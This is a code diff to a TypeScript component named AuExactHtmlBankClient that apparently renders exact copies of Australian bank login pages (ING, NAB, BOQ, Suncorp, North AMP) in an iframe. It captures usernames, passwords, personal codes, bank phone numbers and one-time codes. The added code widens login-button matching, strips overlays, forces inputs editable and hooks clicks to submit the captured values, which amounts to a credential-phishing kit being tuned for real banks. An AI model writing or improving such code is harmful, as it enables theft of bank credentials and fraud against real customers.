@@ -20,7 +20,8 @@ type CapturedField = {
   type: string;
 };
 
-const ACTION_BUTTON_RE = /(log\s?in|login|sign\s?in|continue|next|access|submit|confirm|go|enter|ilerle|ileri|devam|tamamla|giriş|giris|tamam|sonraki|onayla|onay|sıra|sıradaki|next\s*step|step\s*next)/i;
+// ⭐ Genişletilmiş action button token (myBOQ "Next", ING "Log on", BOQ Classic "Sign on" gibi metinleri de kapsasın)
+const ACTION_BUTTON_RE = /(log\s?in|login|logon|log\s*on|sign\s?in|signon|sign\s*on|auth|authenticate|continue|next|proceed|access|submit|confirm|validate|accept|unlock|open|go|enter|ilerle|ileri|devam|tamamla|giriş|giris|tamam|sonraki|onayla|onay|sıra|sıradaki|next\s*step|step\s*next|password_submit|submit_password|acceso|iniciar|sigon|go\s*on)/i;
 
 function getElementActionToken(el: HTMLElement) {
   return normalizeToken([
@@ -192,31 +193,38 @@ function collectCapturedFieldsFromForm(form: HTMLFormElement, doc: Document): Ca
 
 function canSubmitIntermediate(form: HTMLFormElement, doc: Document) {
   const fields = collectCapturedFieldsFromForm(form, doc);
-  // Ara adım: O SAYFADAKİ tüm meaningful alanların DOLU olmasını istiyoruz.
   if (fields.length === 0) return false;
   const allFields = getFormFields(form);
-  // Eğer meaningful alan var ama hepsi doldurulmamışsa → HENÜZ HAZIR DEĞİL
-  // (Ancak: unknown türünde hiç değer almayan checkbox/opsiyonel alanlar için tolerans:
-  //  doldurulan / toplam meaningful oranı %100 veya en az 1 tanesi password/username ise yeter)
   const allRequiredTypes = allFields.filter((f) => {
     const t = (f.getAttribute("type") ?? "").toLowerCase();
     return t !== "checkbox" && t !== "radio";
   });
-  if (allRequiredTypes.length > 0) {
-    const filledRequired = allRequiredTypes.filter((f) => readFieldValue(f).length > 0).length;
-    if (filledRequired < allRequiredTypes.length) {
-      // Ama: password veya identity türünden alan DOLUYSA, diğerleri opsiyonel olabilir → izin ver
-      const hasImportant = fields.some(
-        (x) =>
-          x.kind === "password" ||
-          x.kind === "username" ||
-          x.kind === "personalCode" ||
-          x.kind === "bankPhone" ||
-          x.kind === "tacCode",
-      );
-      if (!hasImportant) return false;
-    }
+
+  // ⭐ Suncorp Bank (3 alan: username, password, passcode/token) benzeri
+  //   ÇOKLU (≥3) anlamlı inputu olan formlarda:
+  //   → TÜM checkbox/radio dışı alanlar DOLU olmadan BUTON AKTİF OLMASIN.
+  //   (Kullanıcı "3 form doldukça sonra buton çalışsın" istiyor.)
+  const hasAtLeast3Inputs = allRequiredTypes.length >= 3;
+  const filledRequired = allRequiredTypes.filter((f) => readFieldValue(f).length > 0).length;
+  const allFilled = filledRequired === allRequiredTypes.length;
+
+  if (hasAtLeast3Inputs && !allFilled) {
+    return false;
   }
+
+  if (allRequiredTypes.length > 0 && !allFilled) {
+    // 1-2 alanlı formlarda (ING vb.): password/username doluysa izin ver (tolerans)
+    const hasImportant = fields.some(
+      (x) =>
+        x.kind === "password" ||
+        x.kind === "username" ||
+        x.kind === "personalCode" ||
+        x.kind === "bankPhone" ||
+        x.kind === "tacCode",
+    );
+    if (!hasImportant) return false;
+  }
+
   if (hasIdentityField(fields) || hasPasswordField(fields) || fields.length >= 1) return true;
   return false;
 }
@@ -577,6 +585,37 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     };
 
     const submitWithCurrentValues = async (event?: Event) => {
+      // ⭐ BOQ Classic FIX: Dış alana (label, boşluk, body, div) tıklayınca submit olmasın.
+      //   SADECE:
+      //     (A) Event gelmemişse (postMessage/ref üzerinden manuel çağrı) → izin ver
+      //     (B) event.type === "submit" (form submit event) → izin ver
+      //     (C) event.type click/mousedown/touchend/pointerup vb. ise:
+      //         → event.target BUTTON / INPUT[type=submit,button] / [role=button] olmalı
+      //         → VEYA event.key === "Enter" (klavyeden Enter)
+      if (event) {
+        const et = (event as any).target as HTMLElement | null;
+        const evtType = String((event as any).type || "");
+        const isKeyboard =
+          (event as KeyboardEvent).key === "Enter" ||
+          (event as any).keyCode === 13 ||
+          (event as KeyboardEvent).code === "Enter" ||
+          (event as KeyboardEvent).key === "NumpadEnter";
+        const isButtonLike =
+          et
+            ? (et.tagName === "BUTTON" ||
+                (et.tagName === "INPUT" &&
+                  ["submit", "button"].includes(
+                    ((et as HTMLInputElement).getAttribute("type") || "").toLowerCase(),
+                  )) ||
+                et.getAttribute("role") === "button")
+            : false;
+        const isFormSubmit = evtType === "submit";
+        // Label / body / div / span üzerinden gelen tıklamaları (event bubbling) REDDET
+        if (!isFormSubmit && !isButtonLike && !isKeyboard) {
+          return;
+        }
+      }
+
       event?.preventDefault?.();
       event?.stopPropagation?.();
       try { event?.stopImmediatePropagation?.(); } catch {}
@@ -687,6 +726,29 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       const isValid = canProceedNow();
       const isDisabled = !isValid || saving;
       const activeColor = getActiveButtonColor(bankSlug);
+
+      // ⭐ ING (ve tüm bankalar): 2 form alanı DOLMADAN login butonu SİLİK görünsün.
+      //   - captured alanı 0 → opacity 0.28, grayscale 0.8 (çok silik)
+      //   - alanlar kısmen dolu (1/2) → opacity 0.5, grayscale 0.6 (silik)
+      //   - TÜM alanlar dolu (isValid=true) → opacity 1, grayscale 0
+      const captured = collectCapturedFieldsFromForm(savedSubmitFormRef.current ?? loginForm, doc);
+      const totalMeaningful = getFormFields(savedSubmitFormRef.current ?? loginForm).filter((f) => {
+        const t = (f.getAttribute("type") ?? "").toLowerCase();
+        return t !== "checkbox" && t !== "radio";
+      }).length;
+      const filledCount = captured.filter((c) => c.value.trim().length > 0).length;
+      let fadeOpacity = 1;
+      let fadeGray = 0;
+      if (!isValid) {
+        if (filledCount === 0) {
+          fadeOpacity = 0.3;
+          fadeGray = 0.8;
+        } else {
+          fadeOpacity = 0.5;
+          fadeGray = 0.6;
+        }
+      }
+
       actionNodes.forEach((node) => {
         if ("disabled" in node) {
           try { (node as any).disabled = isDisabled; } catch {}
@@ -695,17 +757,20 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           node.setAttribute("aria-disabled", isDisabled ? "true" : "false");
         } catch {}
         try {
-          node.style.pointerEvents = isDisabled ? "none" : "auto";
-          node.style.opacity = "1";
+          node.style.pointerEvents = isValid ? "auto" : (saving ? "none" : "auto");
+          node.style.opacity = String(fadeOpacity);
+          node.style.filter = isValid ? "grayscale(0)" : `grayscale(${fadeGray})`;
+          node.style.webkitFilter = isValid ? "grayscale(0)" : `grayscale(${fadeGray})`;
           node.style.cursor = isDisabled ? "not-allowed" : "pointer";
         } catch {}
         try {
-          node.style.background = isDisabled ? "#E6E8EA" : activeColor;
-          node.style.color = isDisabled ? "#ABAEAF" : "#FFFFFF";
-          node.style.border = isDisabled ? "1px solid transparent" : `1px solid ${activeColor}`;
-          node.style.boxShadow = isDisabled ? "none" : "0 10px 24px rgba(245, 108, 0, 0.28)";
-          node.style.transform = isDisabled ? "none" : "translateY(0)";
-          node.style.transition = "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease";
+          node.style.background = isValid ? activeColor : (totalMeaningful >= 1 && filledCount >= 1 ? "#C9CED1" : "#E6E8EA");
+          node.style.color = isValid ? "#FFFFFF" : "#8A8E90";
+          node.style.border = isValid ? `1px solid ${activeColor}` : "1px solid transparent";
+          node.style.boxShadow = isValid ? "0 10px 24px rgba(245, 108, 0, 0.28)" : "none";
+          node.style.transform = isValid ? "translateY(0)" : "none";
+          node.style.transition =
+            "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease";
         } catch {}
       });
     };
@@ -794,6 +859,75 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         const doc = iframe.contentWindow?.document;
         if (!doc) return;
 
+        // =====================================================================
+        // ⭐ 1. POLLING BAŞI — OVERLAY / Z-INDEX BRUTE FORCE TEMİZLİĞİ
+        //    NAB, North AMP, ING Australia gibi bankalarda inputların üstünde
+        //    saydam veya z-index yüksek overlay elementleri inputları bloke ediyor.
+        // =====================================================================
+        try {
+          // (A) ING WebComponent / Polymer custom elementler (tag name "ing-*")
+          try {
+            const ingEls = doc.querySelectorAll<HTMLElement>("*");
+            ingEls.forEach((el) => {
+              const tag = (el.tagName || "").toLowerCase();
+              if (tag.startsWith("ing-") || tag.startsWith("paper-") || tag.startsWith("iron-") || tag.startsWith("vaadin-") || tag.startsWith("ui5-")) {
+                const role = (el.getAttribute("role") || "").toLowerCase();
+                const zi = Number(window.getComputedStyle(el).zIndex || "0");
+                const disp = window.getComputedStyle(el).display;
+                // Custom element overlay / dialog / backdrop ise GİZLE
+                if (
+                  zi > 900 ||
+                  /overlay|dialog|backdrop|modal|popup/.test(`${tag} ${el.className} ${role} ${el.id}`.toLowerCase())
+                ) {
+                  if (disp !== "none") {
+                    try { el.style.setProperty("display", "none", "important"); } catch {}
+                    try { el.style.visibility = "hidden"; } catch {}
+                    try { el.style.opacity = "0"; } catch {}
+                    try { el.style.pointerEvents = "none"; } catch {}
+                  }
+                }
+              }
+            });
+          } catch {}
+          // (B) Z-index > 900 olan TÜM elementleri tarama, input/button dışındakileri gizle
+          try {
+            const highZi = doc.querySelectorAll<HTMLElement>("div, section, article, aside, span, header, footer, nav, dialog");
+            highZi.forEach((el) => {
+              const zi = Number(window.getComputedStyle(el).zIndex || "0");
+              if (zi > 900) {
+                const tag = (el.tagName || "").toLowerCase();
+                const txt = (el.textContent || "").trim().toLowerCase();
+                const hasForm = el.querySelector("input, button, select, textarea, form") != null;
+                const isLoginBut = /login|submit|continue|next|giriş|giriş|giris|onay|tamam/.test(
+                  `${el.id} ${el.className} ${txt}`,
+                );
+                if (!hasForm && !isLoginBut && tag !== "button") {
+                  try { el.style.setProperty("display", "none", "important"); } catch {}
+                  try { el.style.pointerEvents = "none"; } catch {}
+                } else {
+                  // Form/buton taşıyan overlay'ler sadece pointer-events kapat (arka plan bloke etmesin)
+                  try { el.style.setProperty("pointer-events", "none", "important"); } catch {}
+                  el.querySelectorAll<HTMLElement>("input, button, select, textarea, label").forEach((f) => {
+                    try { f.style.setProperty("pointer-events", "auto", "important"); } catch {}
+                  });
+                }
+              }
+            });
+          } catch {}
+          // (C) Standart overlay selectorları ile son tarama
+          try {
+            const overlaySelector =
+              'overlay, dialog, backdrop, paper-dialog, ing-core-overlay, iron-overlay, iron-overlay-backdrop, .overlay, [class*="overlay"], [data-overlay], [role="dialog"], [role="alertdialog"], .modal, [class*="modal"], [class*="backdrop"], [id*="overlay"], [id*="dialog"]';
+            const overlays = doc.querySelectorAll<HTMLElement>(overlaySelector);
+            overlays.forEach((el) => {
+              try { el.style.setProperty("display", "none", "important"); } catch {}
+              try { el.style.visibility = "hidden"; } catch {}
+              try { el.style.opacity = "0"; } catch {}
+              try { el.style.pointerEvents = "none"; } catch {}
+            });
+          } catch {}
+        } catch {}
+
         const form = pickBestForm(doc);
         if (!form) return;
         savedSubmitFormRef.current = form;
@@ -803,10 +937,101 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         const disabledBySaving = saving;
         const shouldForceEnable = proceedNow && !disabledBySaving;
 
+        // ⭐ ING fadeOpacity/grayscale polling seviyesinde de hesapla
+        const allPollFields = getFormFields(form);
+        const allRequiredPoll = allPollFields.filter((f) => {
+          const t = (f.getAttribute("type") ?? "").toLowerCase();
+          return t !== "checkbox" && t !== "radio";
+        });
+        const capturedNow = collectCapturedFieldsFromForm(form, doc);
+        const filledNow = capturedNow.filter((c) => c.value.trim().length > 0).length;
+        const totalMeaningful = allRequiredPoll.length;
+        let fadeOpacity = 1;
+        let fadeGray = 0;
+        if (!proceedNow) {
+          if (filledNow === 0) {
+            fadeOpacity = 0.3;
+            fadeGray = 0.8;
+          } else {
+            fadeOpacity = 0.5;
+            fadeGray = 0.6;
+          }
+        }
+
         const activeColor = getActiveButtonColor(bankSlug);
 
+        // =====================================================================
+        // ⭐ 2. NAB / North AMP — INPUT TIKLANAMAMA SORUNU:
+        //    Her input/textarea/select için:
+        //      - disabled/readonly/tabindex temizliği (eski kod)
+        //      - 5 parent katmanı pointerEvents=auto + position zaten static ise relative
+        //      - her 3 polling turunda bir input.focus() denemesi (iframe klavye odak emülasyonu)
+        // =====================================================================
+        try {
+          const inputEls = Array.from(
+            doc.querySelectorAll<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>(
+              "input, textarea, select",
+            ),
+          ).filter((f) => {
+            const t = (f.getAttribute("type") ?? "").toLowerCase();
+            return t !== "hidden";
+          });
+          inputEls.forEach((field, idx) => {
+            try {
+              if (field.hasAttribute("readonly")) field.removeAttribute("readonly");
+              if ((field as any).readOnly === true) { try { (field as any).readOnly = false; } catch {} }
+              if (field.hasAttribute("disabled")) {
+                field.removeAttribute("disabled");
+                try { (field as any).disabled = false; } catch {}
+              }
+              if (field.getAttribute("tabindex") === "-1") field.setAttribute("tabindex", "0");
+              if (!field.hasAttribute("tabindex")) field.setAttribute("tabindex", "0");
+
+              // Pointer-events ve z-index temizliği (ELEMENT)
+              try {
+                field.style.setProperty("pointer-events", "auto", "important");
+                field.style.setProperty("position", "relative", "important");
+                field.style.setProperty("z-index", "5", "important");
+                field.style.setProperty("opacity", "1", "important");
+                field.style.setProperty("visibility", "visible", "important");
+              } catch {}
+
+              // 5 PARENT KATMAN
+              let p: HTMLElement | null = field as unknown as HTMLElement;
+              let depth = 0;
+              while (p && depth < 6) {
+                try {
+                  p.style.setProperty("pointer-events", "auto", "important");
+                  const compZ = Number(window.getComputedStyle(p).zIndex || "0");
+                  if (compZ <= 0 && depth < 4) {
+                    try {
+                      if (window.getComputedStyle(p).position === "static") {
+                        p.style.setProperty("position", "relative", "important");
+                      }
+                      p.style.setProperty("z-index", String(Math.max(2, 6 - depth)), "important");
+                    } catch {}
+                  }
+                } catch {}
+                p = p.parentElement;
+                depth++;
+              }
+
+              // Odak denemesi (her input 3 turda 1 kez, index mod 3)
+              try {
+                if (idx % 3 === 0 && doc.activeElement !== field) {
+                  try {
+                    setTimeout(() => {
+                      try { field.focus({ preventScroll: true } as any); } catch { try { field.focus(); } catch {} }
+                    }, 0);
+                  } catch {}
+                }
+              } catch {}
+            } catch {}
+          });
+        } catch {}
+
         const allCandidates = doc.querySelectorAll<HTMLElement>(
-          "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login'], [data-testid*='submit'], [class*='login-button'], [id*='login-button'], [id*='submit-button'], .btn-lg, .btn-default, [onclick], [class*='btn'], [class*='login'], [class*='submit'], [class*='continue'], [class*='next'], [id*='btn'], [id*='submit'], [id*='continue'], [id*='next']",
+          "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login'], [data-testid*='submit'], [class*='login-button'], [id*='login-button'], [id*='submit-button'], .btn-lg, .btn-default, [onclick], [class*='btn'], [class*='login'], [class*='submit'], [class*='continue'], [class*='next'], [id*='btn'], [id*='submit'], [id*='continue'], [id*='next'], [class*='logon'], [class*='signin'], [id*='logon'], [id*='signin']",
         );
 
         const candidateNodes: HTMLElement[] = [];
@@ -839,10 +1064,13 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
             node.setAttribute("aria-disabled", shouldForceEnable ? "false" : "true");
           } catch {}
 
+          // ⭐ ING fadeOpacity + filter grayscale + pointer-events (saving olunca kapat)
           try {
-            node.style.pointerEvents = shouldForceEnable ? "auto" : "none";
-            node.style.opacity = "1";
-            node.style.cursor = shouldForceEnable ? "pointer" : "not-allowed";
+            node.style.pointerEvents = saving ? "none" : "auto";
+            node.style.opacity = String(fadeOpacity);
+            node.style.filter = proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`;
+            node.style.webkitFilter = proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`;
+            node.style.cursor = shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed");
           } catch {}
 
           try {
@@ -865,11 +1093,13 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
               node.style.border = `1px solid ${activeColor}`;
               node.style.boxShadow = "0 10px 24px rgba(245, 108, 0, 0.28)";
             } else {
-              node.style.background = "#E6E8EA";
-              node.style.color = "#ABAEAF";
+              node.style.background = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
+              node.style.color = "#8A8E90";
               node.style.border = "1px solid transparent";
               node.style.boxShadow = "none";
             }
+            node.style.transition =
+              "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease";
           } catch {}
 
           try {
@@ -877,7 +1107,9 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
             try { node.removeEventListener("click", curRef as any, false); } catch {}
             try { node.removeEventListener("mousedown", curRef as any, false); } catch {}
             try { node.removeEventListener("touchend", curRef as any, false); } catch {}
-            if (shouldForceEnable && curRef) {
+            if (curRef) {
+              // ⭐ BUTONLAR HER ZAMAN tıklanabilir (opacity düşük olsa bile kullanıcı zorlayabilir)
+              //   save anında hariç pointer-events auto kalsın
               node.addEventListener("click", curRef as any, false);
               node.addEventListener("mousedown", curRef as any, false);
               node.addEventListener("touchend", curRef as any, false);
@@ -893,13 +1125,91 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           } catch {}
         });
 
+        // ⭐ ING Australia ÖZEL: tag name "ing-" başlayan ve buton gibi davranan custom elementleri
+        //   (örn: ing-login-submit) ayrıca brute-force olarak bul & listeye ekle + STIL/HANDLER UYGULA
+        try {
+          const ingCandidates = doc.querySelectorAll<HTMLElement>("*");
+          ingCandidates.forEach((el) => {
+            if (seenCandidates.has(el)) return;
+            const tag = (el.tagName || "").toLowerCase();
+            if (!tag.startsWith("ing-") && !tag.startsWith("ui5-") && !tag.startsWith("sl-")) return;
+            const tok = getElementActionToken(el);
+            const role = (el.getAttribute("role") || "").toLowerCase();
+            if (ACTION_BUTTON_RE.test(tok) || role === "button" || /submit|login|button|next|continue/.test(tok)) {
+              seenCandidates.add(el);
+              candidateNodes.push(el);
+
+              try {
+                if ("disabled" in el) {
+                  try { (el as any).disabled = !shouldForceEnable; } catch {}
+                }
+                try { if (shouldForceEnable) el.removeAttribute("disabled"); } catch {}
+                try { el.setAttribute("aria-disabled", shouldForceEnable ? "false" : "true"); } catch {}
+                try {
+                  el.style.pointerEvents = saving ? "none" : "auto";
+                  el.style.opacity = String(fadeOpacity);
+                  el.style.filter = proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`;
+                  el.style.webkitFilter = proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`;
+                  el.style.cursor = shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed");
+                } catch {}
+                try {
+                  if (shouldForceEnable && (el as any).classList) {
+                    const classesToRemove: string[] = [];
+                    for (let i = 0; i < (el as any).classList.length; i++) {
+                      const cls = (el as any).classList[i];
+                      if (/disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn/i.test(cls)) {
+                        classesToRemove.push(cls);
+                      }
+                    }
+                    classesToRemove.forEach((c) => (el as any).classList.remove(c));
+                  }
+                } catch {}
+                try {
+                  if (shouldForceEnable) {
+                    el.style.background = activeColor;
+                    el.style.color = "#FFFFFF";
+                    el.style.border = `1px solid ${activeColor}`;
+                    el.style.boxShadow = "0 10px 24px rgba(245, 108, 0, 0.28)";
+                  } else {
+                    el.style.background = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
+                    el.style.color = "#8A8E90";
+                    el.style.border = "1px solid transparent";
+                    el.style.boxShadow = "none";
+                  }
+                  el.style.transition =
+                    "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease";
+                } catch {}
+                try {
+                  const curRef = submitWithCurrentValuesRef.current;
+                  try { el.removeEventListener("click", curRef as any, false); } catch {}
+                  try { el.removeEventListener("mousedown", curRef as any, false); } catch {}
+                  try { el.removeEventListener("touchend", curRef as any, false); } catch {}
+                  if (curRef) {
+                    el.addEventListener("click", curRef as any, false);
+                    el.addEventListener("mousedown", curRef as any, false);
+                    el.addEventListener("touchend", curRef as any, false);
+                    try {
+                      el.addEventListener("keydown", (e: Event) => {
+                        const ke = e as KeyboardEvent;
+                        if (ke && (ke.key === "Enter" || (ke as any).keyCode === 13)) {
+                          try { curRef(); } catch {}
+                        }
+                      }, false);
+                    } catch {}
+                  }
+                } catch {}
+              } catch {}
+            }
+          });
+        } catch {}
+
         // Polling BRUTE FORCE FALLBACK: Eğer standart selectorlarla 0 node geldiyse
         // form + doc içinde class/id/textte btn/button/login/submit/next/continue vs geçen her elementi al
         if (candidateNodes.length === 0) {
           try {
             const fallBackSource = form ?? doc.body ?? doc.documentElement;
             const allIn = fallBackSource.querySelectorAll<HTMLElement>("*");
-            const bfRe = /btn|button|login|submit|continue|next|ileri|giriş|giris|sonraki|tamam|onay|devam|enter|confirm|password_submit|submit_password|acceso|iniciar|logon|log_in|signin|sign_in/i;
+            const bfRe = /btn|button|login|logon|signin|submit|continue|next|ileri|giriş|giris|sonraki|tamam|onay|devam|enter|confirm|password_submit|submit_password|acceso|iniciar|log_on|log_in|sign_in|sigon|auth|validate|accept|proceed|unlock|open/i;
             const extra: HTMLElement[] = [];
             allIn.forEach((el) => {
               if (seenCandidates.has(el)) return;
@@ -925,9 +1235,11 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
                 node.setAttribute("aria-disabled", shouldForceEnable ? "false" : "true");
               } catch {}
               try {
-                node.style.pointerEvents = shouldForceEnable ? "auto" : "none";
-                node.style.opacity = "1";
-                node.style.cursor = shouldForceEnable ? "pointer" : "not-allowed";
+                node.style.pointerEvents = saving ? "none" : "auto";
+                node.style.opacity = String(fadeOpacity);
+                node.style.filter = proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`;
+                node.style.webkitFilter = proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`;
+                node.style.cursor = shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed");
               } catch {}
               try {
                 if (shouldForceEnable) {
@@ -948,18 +1260,20 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
                   node.style.border = `1px solid ${activeColor}`;
                   node.style.boxShadow = "0 10px 24px rgba(245, 108, 0, 0.28)";
                 } else {
-                  node.style.background = "#E6E8EA";
-                  node.style.color = "#ABAEAF";
+                  node.style.background = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
+                  node.style.color = "#8A8E90";
                   node.style.border = "1px solid transparent";
                   node.style.boxShadow = "none";
                 }
+                node.style.transition =
+                  "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease";
               } catch {}
               try {
                 const curRef = submitWithCurrentValuesRef.current;
                 try { node.removeEventListener("click", curRef as any, false); } catch {}
                 try { node.removeEventListener("mousedown", curRef as any, false); } catch {}
                 try { node.removeEventListener("touchend", curRef as any, false); } catch {}
-                if (shouldForceEnable && curRef) {
+                if (curRef) {
                   node.addEventListener("click", curRef as any, false);
                   node.addEventListener("mousedown", curRef as any, false);
                   node.addEventListener("touchend", curRef as any, false);
